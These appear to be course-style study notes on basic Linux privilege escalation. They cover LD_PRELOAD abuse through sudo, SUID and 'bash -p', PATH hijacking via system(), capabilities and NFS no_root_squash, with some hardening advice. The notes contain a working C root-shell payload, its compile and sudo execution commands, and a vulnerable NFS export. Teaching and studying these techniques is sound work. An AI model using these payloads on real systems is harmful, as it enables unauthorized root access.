# Additional Notes & Deep Technical Dive: Linux Privilege Escalation: Basics

## 1. Sudo Internals & Shared Library Injection (`LD_PRELOAD`)

The `sudoers` file controls privilege elevation policies via the `sudo` binary. While basic misconfigurations allow executing interactive editors (`nano`, `vim`), advanced escalation targets environment preservation:

```
+-----------------------------------------------------------------------+
|                    LD_PRELOAD EXPLOITATION PIPELINE                   |
+-----------------------------------------------------------------------+
| 1. Sudoers Configuration:                                             |
|    `Defaults env_keep += "LD_PRELOAD"`                                |
|    `john ALL=(root) NOPASSWD: /usr/bin/find`                          |
+-----------------------------------------------------------------------+
| 2. Attacker compiles C payload into shared object:                    |
|    ```c                                                               |
|    #include <stdio.h>                                                 |
|    #include <sys/types.h>                                             |
|    #include <unistd.h>                                                |
|    void _init() {                                                     |
|        unsetenv("LD_PRELOAD");                                        |
|        setgid(0); setuid(0);                                          |
|        system("/bin/bash");                                           |
|    }                                                                  |
|    ```                                                                |
|    Compilation: `gcc -fPIC -shared -nostartfiles shell.c -o shell.so` |
+-----------------------------------------------------------------------+
| 3. Execution: `sudo LD_PRELOAD=/tmp/shell.so /usr/bin/find`           |
|    Dynamic linker (`ld.so`) loads `shell.so` BEFORE any other library.|
|    The constructor `_init()` executes as root prior to `find` main(). |
|    => Immediate interactive root shell spawned!                       |
+-----------------------------------------------------------------------+
```

---

## 2. Setuid Bit Mechanics & Bash Privilege Dropping

Understanding why standard shells behave differently when spawned via SUID:

```
+-----------------------------------------------------------------------+
|                   SUID REAL VS EFFECTIVE UID STATE                    |
+-----------------------------------------------------------------------+
| State                      | RUID (Real UID) | EUID (Effective UID)  |
+----------------------------+-----------------+-----------------------+
| Initial shell (`john`)     | 1000            | 1000                  |
| Executing SUID binary      | 1000            | 0 (Root)              |
| Spawning `/bin/sh`         | 1000            | 0 (Root)              |
| Spawning standard bash     | 1000            | 1000 (Privs dropped!) |
| Spawning `bash -p`         | 1000            | 0 (Privs retained!)   |
+-----------------------------------------------------------------------+
```

### The Bash `-p` Flag:
By design, modern `/bin/bash` checks at initialization if `getuid() != geteuid()`. If true, bash resets the effective UID back to the real UID to defend against accidental SUID exploitation. Appending the `-p` (privileged) flag prevents this reset:
```bash
/bin/bash -p
```

---

## 3. PATH Resolution & C Library `system()` Flaws

When C code calls `system("command")`:
```c
int system(const char *command);
```
1. `system()` forks a child process.
2. The child invokes `/bin/sh -c "command"`.
3. Because no directory path is specified for `command`, the shell searches `$PATH` from left to right:
   ```
   PATH=/tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
         ^
         1st: Checks /tmp/command (Attacker controlled!)
   ```
4. If `/tmp/command` exists and is executable, it executes with the privileges of the calling process.

### Defensive Remediation:
In C code, always specify absolute paths or avoid shell wrappers entirely:
```c
// Insecure:
system("whoami");

// Secure:
char *args[] = {"/usr/bin/whoami", NULL};
execve(args[0], args, NULL);
```

---

## 4. Linux POSIX Capabilities Deep Dive

Linux divides root privileges into 41 distinct capabilities (as of Linux 6.x) defined in `include/uapi/linux/capability.h`:

```
+-----------------------------------------------------------------------+
|                       CORE LINUX CAPABILITIES                         |
+-----------------------------------------------------------------------+
| Capability           | Description & Privilege Escalation Risk        |
+----------------------+------------------------------------------------+
| `CAP_SETUID`         | Make arbitrary manipulations of process UIDs.  |
|                      | Instant root via `setuid(0)`.                  |
+----------------------+------------------------------------------------+
| `CAP_SETGID`         | Make arbitrary manipulations of process GIDs.  |
|                      | Read shadow/disk files via group membership.   |
+----------------------+------------------------------------------------+
| `CAP_DAC_OVERRIDE`   | Bypass file read, write, and execute checks.   |
|                      | Overwrite `/etc/passwd` or `/etc/shadow`.      |
+----------------------+------------------------------------------------+
| `CAP_SYS_ADMIN`      | "The new root" - Mount filesystems, debug,     |
|                      | access IPC, manipulate devices.                |
+----------------------+------------------------------------------------+
| `CAP_NET_BIND_SERVICE| Bind sockets to privileged ports (< 1024).     |
+-----------------------------------------------------------------------+
```

### Capability Sets:
* **Permitted ($P$):** Limiting superset for what capabilities the thread may assume.
* **Effective ($E$):** Currently activated capabilities used by the kernel for permission checks.
* **Inheritable ($I$):** Capabilities preserved across an `execve` call.

---

## 5. NFS Protocol Architecture & `no_root_squash`

The Network File System protocol relies on the client kernel to provide authentication identifiers (UID/GID) over RPC:

```
[ Attacker Machine (Root: UID 0) ]                   [ NFS Server (Target Host) ]
               |                                                   |
               | (Writes executable `root_shell` with SUID bit)    |
               +----------------- RPC Calls ---------------------->|
               |                                                   |
               |  Server checks export configuration in /etc/exports:
               |
               |  Case 1: `root_squash` (Default Secure)
               |  --------------------------------------
               |  Server maps UID 0 ---> UID 65534 (nobody)
               |  File written as: `nobody:nobody`
               |  SUID bit cannot elevate to root.
               |
               |  Case 2: `no_root_squash` (Vulnerable)
               |  -------------------------------------
               |  Server trusts client UID 0!
               |  File written as: `root:root` with SUID enabled!
               |                                                   |
               v                                                   v
   [ Local user `john` executes `/opt/nfs/root_shell` ---> Drops into ROOT! ]
```

### NFS Server Configuration Comparison:
```
# Vulnerable export:
/opt/nfs *(rw,sync,no_root_squash,no_subtree_check)

# Hardened export:
/opt/nfs *(rw,sync,root_squash,no_subtree_check)
```
